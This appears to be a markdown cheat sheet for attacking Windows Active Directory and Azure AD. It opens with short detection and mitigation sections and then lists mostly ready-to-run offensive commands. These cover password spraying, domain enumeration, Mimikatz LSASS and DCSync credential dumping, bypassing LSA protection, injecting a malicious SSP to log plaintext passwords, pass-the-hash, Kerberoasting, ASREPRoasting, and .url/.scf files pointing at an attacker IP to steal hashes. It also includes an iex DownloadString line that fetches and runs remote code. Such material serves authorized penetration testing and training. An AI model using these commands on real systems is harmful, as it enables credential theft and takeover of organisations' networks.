Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select -ExpandProperty message
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select-ExpandPropertymessage
```

### ACL Attacks - Detection 
The "audit policy" for the object must be enabled for the events below:  
- Security Event ID 4662 - An operation was performed on an object;  
- Security Event ID 5136 - A directory service object was modified;  
- Security Event ID 4670 - Permissions on an object were changed.

* Tool  
AD ACL Scanner - Create ACL's reports and compare.  
https://github.com/canix1/ADACLScanner  

## Mitigation and Defense Mechanisms
### Best Practices for Securing Active Directory
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/best-practices-for-securing-active-directory

### Securing privileged access
https://learn.microsoft.com/en-us/security/privileged-access-workstations/overview

### Pass-The-Hash - Mitigation
https://download.microsoft.com/download/7/7/a/77abc5bd-8320-41af-863c-6ecfb10cb4b9/mitigating%20pass-the-hash%20(pth)%20attacks%20and%20other%20credential%20theft%20techniques_english.pdf

### Kerberoast - Mitigation
- Service Account Passwords with more than 25 characters;  
- Use managed service accounts by setting automatic password change periodically and delegated SPN management  

https://technet.microsoft.com/en-us/library/jj128431(v=ws.11).aspx  

### Skeleton Key - Mitigation
- Run lsass.exe as a protected process, forcing an attacker to load a kernel-mode driver
```
New-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name RunAsPPL -Value 1 -Verbose
```
* Checking after a reboot
```
Get-WinEvent -FilterHashtable @{Logname='System';ID=12} | ?{$_.message -like "*protected process*"}
```

### Delegation - Mitigation
* Restrict logins of high privilege users like Domain Admin and other admins to specific servers. 
* "There are a number of configuration options we recommend for securing high privileged accounts. One of them, enabling 'Account is sensitive and cannot be delegated' , ensures that an account’s credentials cannot be forwarded to other computers or services on the network by a trusted application."
Reference:  
https://docs.microsoft.com/en-us/archive/blogs/poshchap/security-focus-analysing-account-is-sensitive-and-cannot-be-delegated-for-privileged-accounts

### PowerShell - Recommendation
* Upgrade to windows powershell 5.1  
In Windows PowerShell 5.1 there are several security controls that increase the complexity for attackers to succeed in their exploits.

### Whitelisting - Recommendation
Use AppLocker and Device Guard application control policies to restrict PowerShell scripts. With Applocker set to “allow mode” for scripts, PowerShell5 will automatically use restricted language mode.  
https://learn.microsoft.com/pt-br/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview  
https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/  

### NetCease - Recommendation
If feasible, use NetCease, as it changes the permissions in the NetSessionEnum method, removing the permission for the Authenticated Users group, this causes several resources used by intruders during the enumeration to fail, making greater compromises in the Active Directory environment difficult.  
https://github.com/p0w3rsh3ll/NetCease  

### JEA - Just Enough Administration
"Reduce the number of administrators on your machines using virtual accounts or group-managed service accounts to perform privileged actions on behalf of regular users."  
"Better understand what your users are doing with transcripts and logs that show you exactly which commands a user executed during their session."  
Reference:  
https://learn.microsoft.com/pt-br/powershell/scripting/learn/remoting/jea/overview?view=powershell-7.3

Limit what users can do by specifying which cmdlets, functions, and external commands they can run on their machines, also better manage transcripts and logs that show what commands a user performed during the session.  
### Constrained PowerShell
https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/

### LAPS (Local Administrator Password Solution)
https://www.microsoft.com/en-us/download/details.aspx?id=46899

### Credential Guard
Credential Guard uses virtualization to store credentials in containers isolated from the operating system more securely than conventionally.  
- Effective in stopping Pass-TheHash and Over-Pass-The-Hash attacks as it restricts access to NTLM hashes and TGTs.  

* Atention  
- On Windows 10 1709 it is not possible to write Kerberos tickets to memory.  
- But, credentials for local accounts in SAM and Service account credentials from LSA Secrets are not protected;  
- Cannot be enabled on a domain controller as it breaks authentication;  

https://docs.microsoft.com/en-us/windows/access-protection/credential-guard/credential-guard

### Device Guard
Now called Windows Defender Device Guard, it is a combination of software and hardware security features designed to protect a system from malware attacks where it will block untrusted applications from running.  
* Components:  
- CCI(Configurable Code Integrity) - Ensures that only trusted code is executed 
- VSM (Virtual Secure Mode) Protected Code Integrity - Moves KMCI (Kernel Mode Code Integrity) and HVCI(Hypervisor Code Integrity (HVCI) components to VSM, protecting against attacks.  
- Platform and UEFI Secure Boot - Ensures signature of boot binaries and UEFI Firmware, ensuring integrity.   

* Info  
- UMCI(User Mode Code Integrity) helps by interfering with most movement attacks.   
https://docs.microsoft.com/en-us/windows/device-security/device-guard/introduction-to-device-guard-virtualization-based-security-and-code-integrity-policies

### Protected Users Group
- It's a group introduced in Server 2012 R2 for "better protection against credential theft", does not cache credentials, a user added to this group:  
- Cannot use CredSSP and WDigest as there is no more caching of clear text credentials;   
- The NTLM Hash is not cached when a user is in a protected group.

Notes: With a user in this group, given that there is no cached logon, there he is no way to logon offline. Microsoft does not recommend adding Domain Administrators and Enterprise Administrators to this group without testing the true impact of the block.  
https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group

#### Active Directory Administrative Tier Model
Tier 0 - Domain Controller: e.g. domain controllers, domain admins, enterprise admins;  
Tier 1 - Servers: e.g. Administrators of servers;  
Tier 2 - Workstations - e.g. help desk and computer support administrators.  

Apply Control Restrictions - What admins control:
<a href="https://petri-media.s3.amazonaws.com/2017/09/Figure1-1.jpg">
  <img height=350 src="https://petri-media.s3.amazonaws.com/2017/09/Figure1-1.jpg" />
</a>

Logon Restrictions - Where admins can log-on to:  
<a href="https://petri-media.s3.amazonaws.com/2017/09/Figure1-1.jpg">
  <img height=342 src="https://petri-media.s3.amazonaws.com/2017/09/Figure2.jpg" />
</a>

references:  
https://petri.com/use-microsofts-active-directory-tier-administrative-model/
https://learn.microsoft.com/en-us/security/compass/privileged-access-access-model

### Deception Techniques
Deception is a technique that consists of using decoy domain objects, tricking opponents to follow a specific attack path, which increases the chances of detection.  
The adversary must be provided with what he is looking for, so that we can detect him.  
A good tool for this is Deploy-Deception:  
https://github.com/samratashok/Deploy-Deception  
* Find Fake Computer Objects Honey Pots, Fake Service Accounts Honey Tokens, Inactive Domain Adminis Honey Tokens.  
```
Invoke-HoneypotBuster -OpSec
```
https://raw.githubusercontent.com/JavelinNetworks/HoneypotBuster/master/Invoke-HoneypotBuster.ps1 

## Pentest Azure AD
### Enumeration
* Install module
```
Install-Module AzureAD
```

* authenticate to Azure AD
```
Connect-AzureAD
```

* list all domain users
```
Get-AzureADUser -All $true
```

* List all domain groups
```
Get-AzureADGroup -All $true
```

* List members of a domain-specific group
```
Get-AzureADGroupMember -ObjectId <ID>
```

* Enumerate all devices in the domain
```
Get-AzureADDevice -All $true
```

### Password Spraying in Microsoft Online accounts

https://github.com/dafthack/MSOLSpray

* Import Module
```
Import-Module MSOLSpray.ps1
```

* attack
```
Invoke-MSOLSpray -UserList .\users.txt -Password Empresa@2024
```

### Automated Azure AD Enumeration and Dumping

```
azurehound list -u "<user>" -p "<password>" -t "<tenant>"
```
https://github.com/BloodHoundAD/AzureHound

## Domain Enumeration

### Using PowerView

[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)<br>
[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)

- **Get Current Domain:** `Get-Domain`
- **Enumerate Other Domains:** `Get-Domain -Domain <DomainName>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Policy:**

  ```powershell
  Get-DomainPolicy

  #Will show us the policy configurations of the Domain about system access or kerberos
  Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
  Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
  ```

- **Get Domain Controllers:**
  ```powershell
  Get-DomainController
  Get-DomainController -Domain <DomainName>
  ```
- **Enumerate Domain Users:**

  ```powershell
  #Save all Domain Users to a file
  Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

  #Will return specific properties of a specific user
  Get-DomainUser -Identity [username] -Properties DisplayName, MemberOf | Format-List

  #Enumerate user logged on a machine
  Get-NetLoggedon -ComputerName <ComputerName>

  #Enumerate Session Information for a machine
  Get-NetSession -ComputerName <ComputerName>

  #Enumerate domain machines of the current/specified domain where specific users are logged into
  Find-DomainUserLocation -Domain <DomainName> | Select-Object UserName, SessionFromName
  ```

- **Enum Domain Computers:**

  ```powershell
  Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

  #Enumerate Live machines
  Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
  ```

- **Enum Groups and Group Members:**

  ```powershell
  #Save all Domain Groups to a file:
  Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

  #Return members of Specific Group (eg. Domain Admins & Enterprise Admins)
  Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
  Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

  #Enumerate the local groups on the local (or remote) machine. Requires local admin rights on the remote machine
  Get-NetLocalGroup | Select-Object GroupName

  #Enumerates members of a specific local group on the local (or remote) machine. Also requires local admin rights on the remote machine
  Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

  #Return all GPOs in a domain that modify local group memberships through Restricted Groups or Group Policy Preferences
  Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **Enumerate Shares:**

  ```powershell
  #Enumerate Domain Shares
  Find-DomainShare

  #Enumerate Domain Shares the current user has access
  Find-DomainShare -CheckShareAccess

  #Enumerate "Interesting" Files on accessible shares
  Find-InterestingDomainShareFile -Include *passwords*
  ```

- **Enum Group Policies:**

  ```powershell
  Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

  #Enumerate all GPOs to a specific computer
  Get-DomainGPO -ComputerIdentity <ComputerName> -Properties DisplayName | Sort-Object -Property DisplayName

  #Get users that are part of a Machine's local Admin group
  Get-DomainGPOComputerLocalGroupMapping -ComputerName <ComputerName>
  ```

- **Enum OUs:**
  ```powershell
  Get-DomainOU -Properties Name | Sort-Object -Property Name
  ```
- **Enum ACLs:**

  ```powershell
  # Returns the ACLs associated with the specified account
  Get-DomaiObjectAcl -Identity <AccountName> -ResolveGUIDs

  #Search for interesting ACEs
  Find-InterestingDomainAcl -ResolveGUIDs

  #Check the ACLs associated with a specified path (e.g smb share)
  Get-PathAcl -Path "\\Path\Of\A\Share"
  ```

- **Enum Domain Trust:**

  ```powershell
  Get-DomainTrust
  Get-DomainTrust -Domain <DomainName>

  #Enumerate all trusts for the current domain and then enumerates all trusts for each domain it finds
  Get-DomainTrustMapping
  ```

- **Enum Forest Trust:**

  ```powershell
  Get-ForestDomain
  Get-ForestDomain -Forest <ForestName>

  #Map the Trust of the Forest
  Get-ForestTrust
  Get-ForestTrust -Forest <ForestName>
  ```

- **User Hunting:**

  ```powershell
  #Finds all machines on the current domain where the current user has local admin access
  Find-LocalAdminAccess -Verbose

  #Find local admins on all machines of the domain
  Find-DomainLocalGroupMember -Verbose

  #Find computers were a Domain Admin OR a specified user has a session
  Find-DomainUserLocation | Select-Object UserName, SessionFromName

  #Confirming admin access
  Test-AdminAccess
  ```

  :heavy_exclamation_mark: **Priv Esc to Domain Admin with User Hunting:** \
  I have local admin access on a machine -> A Domain Admin has a session on that machine -> I steal his token and impersonate him -> Profit!

### Using AD Module

- **Importing AD Module**
```
PS C:\> iex (new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1');Import-ActiveDirectory
```

- **Get Current Domain:** `Get-ADDomain`
- **Enum Other Domains:** `Get-ADDomain -Identity <Domain>`
- **Get Domain SID:** `Get-DomainSID`
- **Get Domain Controlers:**

  ```powershell
  Get-ADDomainController
  Get-ADDomainController -Identity <DomainName>
  ```

- **Enumerate Domain Users:**

  ```powershell
  Get-ADUser -Filter * -Identity <user> -Properties *

  #Get a specific "string" on a user's attribute
  Get-ADUser -Filter 'Description -like "*wtver*"' -Properties Description | select Name, Description
  ```

- **Enum Domain Computers:**
  ```powershell
  Get-ADComputer -Filter * -Properties *
  Get-ADGroup -Filter *
  ```
- **Enum Domain Trust:**
  ```powershell
  Get-ADTrust -Filter *
  Get-ADTrust -Identity <DomainName>
  ```
- **Enum Forest Trust:**

  ```powershell
  Get-ADForest
  Get-ADForest -Identity <ForestName>

  #Domains of Forest Enumeration
  (Get-ADForest).Domains
  ```

- **Enum Local AppLocker Effective Policy:**

  ```powershell
  Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
  ```

### Using BloodHound

#### Remote BloodHound

[Python BloodHound Repository](https://github.com/fox-it/BloodHound.py) or install it with `pip3 install bloodhound`

```powershell
bloodhound-python -u <UserName> -p <Password> -ns <Domain Controller's Ip> -d <Domain> -c All
```

#### On Site BloodHound

```powershell
#Using exe ingestor
.\SharpHound.exe --CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --domain <Domain> --domaincontroller <Domain Controller's Ip> --OutputDirectory <PathToFile>

#Using PowerShell module ingestor
. .\SharpHound.ps1
Invoke-BloodHound -CollectionMethod All --LdapUsername <UserName> --LdapPassword <Password> --OutputDirectory <PathToFile>
```

### Using Adalanche

#### Remote Adalanche

```bash
# kali linux:
./adalanche collect activedirectory --domain <Domain> \
--username <Username@Domain> --password <Password> \
--server <DC>

# Example:
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb
## -> Terminating successfully

## Any error?:

# LDAP Result Code 200 "Network Error": x509: certificate signed by unknown authority ?

./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389

# Invalid Credentials ?
./adalanche collect activedirectory --domain windcorp.local \
--username spoNge369@windcorp.local --password 'password123!' \
--server dc.windcorp.htb --tlsmode NoTLS --port 389 \
--authmode basic

# Analyze data 
# go to web browser -> 127.0.0.1:8080
./adalanche analyze
```

#### Export Enumerated Objects

You can export enumerated objects from any module/cmdlet  into an XML file for later ananlysis.

The `Export-Clixml` cmdlet creates a Common Language Infrastructure (CLI) XML-based representation of an object or objects and stores it in a file. You can then use the `Import-Clixml` cmdlet to recreate the saved object based on the contents of that file.

```powershell
# Export Domain users to xml file.
Get-DomainUser | Export-CliXml .\DomainUsers.xml

# Later, when you want to utilise them for analysis even on any other machine.
$DomainUsers = Import-CliXml .\DomainUsers.xml

# You can now apply any condition, filters, etc.

$DomainUsers | select name

$DomainUsers | ? {$_.name -match "User's Name"}
```

### Useful Enumeration Tools

- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump) Information dumper via LDAP
- [adidnsdump](https://github.com/dirkjanm/adidnsdump) Integrated DNS dumping by any authenticated user
- [ACLight](https://github.com/cyberark/ACLight) Advanced Discovery of Privileged Accounts
- [ADRecon](https://github.com/sense-of-security/ADRecon) Detailed Active Directory Recon Tool

## Local Privilege Escalation

- [Windows Local Privilege Escalation Cookbook](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook) Cookbook for Windows Local Privilege Escalations

- [Juicy Potato](https://github.com/ohpe/juicy-potato) Abuse SeImpersonate or SeAssignPrimaryToken Privileges for System Impersonation

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803

- [Lovely Potato](https://github.com/TsukiCTF/Lovely-Potato) Automated Juicy Potato

  :warning: Works only until Windows Server 2016 and Windows 10 until patch 1803

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) Exploit the PrinterBug for System Impersonation

  :pray: Works for Windows Server 2019 and Windows 10

- [RoguePotato](https://github.com/antonioCoco/RoguePotato) Upgraded Juicy Potato

  :pray: Works for Windows Server 2019 and Windows 10

- [Abusing Token Privileges](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/)
- [SMBGhost CVE-2020-0796](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/) \
  [PoC](https://github.com/danigargu/CVE-2020-0796)
- [CVE-2021-36934 (HiveNightmare/SeriousSAM)](https://github.com/cube0x0/CVE-2021-36934)

### Useful Local Priv Esc Tools

- [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1) Misconfiguration Abuse
- [BeRoot](https://github.com/AlessandroZ/BeRoot) General Priv Esc Enumeration Tool
- [Privesc](https://github.com/enjoiz/Privesc) General Priv Esc Enumeration Tool
- [FullPowers](https://github.com/itm4n/FullPowers) Restore A Service Account's Privileges

## Lateral Movement

### PowerShell Remoting

```powershell
#Enable PowerShell Remoting on current Machine (Needs Admin Access)
Enable-PSRemoting

#Entering or Starting a new PSSession (Needs Admin Access)
$sess = New-PSSession -ComputerName <Name>
Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
```

### Remote Code Execution with PS Credentials

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

### Import a PowerShell Module and Execute its Functions Remotely

```powershell
#Execute the command and start a session
Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess

#Interact with the session
Enter-PSSession -Session $sess

```

### Executing Remote Stateful commands

```powershell
#Create a new session
$sess = New-PSSession -ComputerName <NameOfComputer>

#Execute command on the session
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

#Check the result of the command to confirm we have an interactive session
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

### Mimikatz

```powershell
#The commands are in cobalt strike format!

#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?

- LSA as a Protected Process (Kernel Land Bypass)

  ```powershell
  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
  #Now lets import the mimidriver.sys to the system
  mimikatz # !+

  #Now lets remove the protection flags from lsass.exe process
  mimikatz # !processprotect /process:lsass.exe /remove

  #Finally run the logonpasswords function to dump lsass
  mimikatz # sekurlsa::logonpasswords
  ```

- LSA as a Protected Process (Userland "Fileless" Bypass)

  - [PPLdump](https://github.com/itm4n/PPLdump)
  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)

- LSA is running as virtualized process (LSAISO) by Credential Guard

  ```powershell
  #Check if a process called lsaiso.exe exists on the running processes
  tasklist |findstr lsaiso

  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
  mimikatz # misc::memssp

  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
  ```

- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)

### Remote Desktop Protocol

If the host we want to lateral move to has "RestrictedAdmin" enabled, we can pass the hash using the RDP protocol and get an interactive session without the plaintext password.

- Mimikatz:

  ```powershell
  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
  privilege::debug
  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"

  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
  ```

- xFreeRDP:

```powershell
xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
```

:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".

- Bypass "Single Session per User" Restriction

On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
```powershell
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
```

Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
```powershell
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
```


### URL File Attacks

- .url file

  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- .scf file

  ```
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use responder to capture the hashes.

:exclamation: .scf file attacks won't work on the latest versions of Windows.

### Useful Tools

- [Powercat](https://github.com/besimorhino/powercat) netcat written in powershell, and provides tunneling, relay and portforward
  capabilities.
- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) fileless lateral movement tool that relies on ChangeServiceConfigA to run command
- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) the ultimate WinRM shell for hacking/pentesting
- [RunasCs](https://github.com/antonioCoco/RunasCs) Csharp and open version of windows builtin runas.exe
- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) creates all possible file formats for url file attacks

## Domain Privilege Escalation

### Kerberoast

_WUT IS DIS?:_ \
 All standard domain users can request a copy of all service accounts along with their correlating password hashes, so we can ask a TGS for any SPN that is bound to a "user"  
 account, extract the encrypted blob that was encrypted using the user's password and bruteforce it offline.

- PowerView:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-NetUser -SPN

  #Get every available SPN account, request a TGS and dump its hash
  Invoke-Kerberoast

  #Requesting the TGS for a single account:
  Request-SPNTicket

  #Export all tickets using Mimikatz
  Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

  ```powershell
  #Get User Accounts that are used as Service Accounts
  Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
  ```

- Impacket:

  ```powershell
  python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
  ```

- Rubeus:

  ```powershell
  #Kerberoasting and outputing on a file with a specific format
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName>

  #Kerberoasting whle being "OPSEC" safe, essentially while not try to roast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /rc4opsec

  #Kerberoast AES enabled accounts
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /aes

  #Kerberoast specific user account
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /user:<username> /simple

  #Kerberoast by specifying the authentication credentials
  Rubeus.exe kerberoast /outfile:<fileName> /domain:<DomainName> /creduser:<username> /credpassword:<password>
  ```

### ASREPRoast

_WUT IS DIS?:_ \
 If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted  
 blob and bruteforce it offline.

- PowerView: `Get-DomainUser -PreauthNotRequired -Verbose`
- AD Module: `Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth`

Forcefully Disable Kerberos Preauth on an account i have Write Permissions or more!
Check for interesting permissions on accounts:

**Hint:** We add a filter e.g. RDPUsers to get "User Accounts" not Machine Accounts, because Machine Account hashes are not crackable!

PowerView:

```powershell
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}
Disable Kerberos Preauth:
Set-DomainObject -Identity <UserAccount> -XOR @{useraccountcontrol=4194304} -Verbose
Check if the value changed:
Get-DomainUser -PreauthNotRequired -Verbose
```

- And finally execute the attack using the [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast) tool.

  ```powershell
  #Get a specific Accounts hash:
  Get-ASREPHash -UserName <UserName> -Verbose

  #Get any ASREPRoastable Users hashes:
  Invoke-ASREPRoast -Verbose
  ```

- Using Rubeus:

  ```powershell
  #Trying the attack for all domain users
  Rubeus.exe asreproast /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast specific user
  Rubeus.exe asreproast /user:<username> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>

  #ASREPRoast users of a specific OU (Organization Unit)
  Rubeus.exe asreproast /ou:<OUName> /format:<hashcat|john> /domain:<DomainName> /outfile:<filename>
  ```

- Using Impacket:

  ```powershell
  #Trying the attack for the specified users on the file
  python GetNPUsers.py <domain_name>/ -usersfile <users_file> -outputfile <FileName>
  ```

### Password Spray Attack

If we have harvest some passwords by compromising a user account, we can use this method to try and exploit password reuse
on other domain accounts.

**Tools:**

- [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
- [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
- [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
- [Spray](https://github.com/Greenwolf/Spray)

### Force Set SPN

_WUT IS DIS ?:
If we have enough permissions -> GenericAll/GenericWrite we can set a SPN on a target account, request a TGS, then grab its blob and bruteforce it._

- PowerView:

  ```powershell
  #Check for interesting permissions on accounts:
  Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

  #Check if current user has already an SPN setted:
  Get-DomainUser -Identity <UserName> | select serviceprincipalname

  #Force set the SPN on the account:
  Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
  ```

- AD Module:

  ```powershell
  #Check if current user has already an SPN setted
  Get-ADUser -Identity <UserName> -Properties ServicePrincipalName | select ServicePrincipalName

  #Force set the SPN on the account:
  Set-ADUser -Identiny <UserName> -ServicePrincipalNames @{Add='ops/whatever1'}
  ```

Finally use any tool from before to grab the hash and kerberoast it!

### Abusing Shadow Copies

If you have local administrator access on a machine try to list shadow copies, it's an easy way for Domain Escalation.

```powershell
#List shadow copies using vssadmin (Needs Admnistrator Access)
vssadmin list shadows

#List shadow copies using diskshadow
diskshadow list shadows all

#Make a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

1. You can dump the backuped SAM database and harvest credentials.
2. Look for DPAPI stored creds and decrypt them.
3. Access backuped sensitive files.

### List and Decrypt Stored Credentials using Mimikatz

Usually encrypted credentials are stored in:

- `%appdata%\Microsoft\Credentials`
- `%localappdata%\Microsoft\Credentials`

```powershell
#By using the cred function of mimikatz we can enumerate the cred object and get information about it:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"

#From the previous command we are interested to the "guidMasterKey" parameter, that tells us which masterkey was used to encrypt the credential
#Lets enumerate the Master Key:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>"

#Now if we are on the context of the user (or system) that the credential belogs to, we can use the /rpc flag to pass the decryption of the masterkey to the domain controler:
dpapi::masterkey /in:"%appdata%\Microsoft\Protect\<usersid>\<MasterKeyGUID>" /rpc

#We now have the masterkey in our local cache:
dpapi::cache

#Finally we can decrypt the credential using the cached masterkey:
dpapi::cred /in:"%appdata%\Microsoft\Credentials\<CredHash>"
```

Detailed Article:
[DPAPI all the things](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials)

### Unconstrained Delegation

_WUT IS DIS ?: If we have Administrative access on a machine that has Unconstrained Delegation enabled, we can wait for a
high value target or DA to connect to it, steal his TGT then ptt and impersonate him!_

Using PowerView:

```powershell
#Discover domain joined computers that have Unconstrained Delegation enabled
Get-NetComputer -UnConstrained

#List tickets and check if a DA or some High Value target has stored its TGT
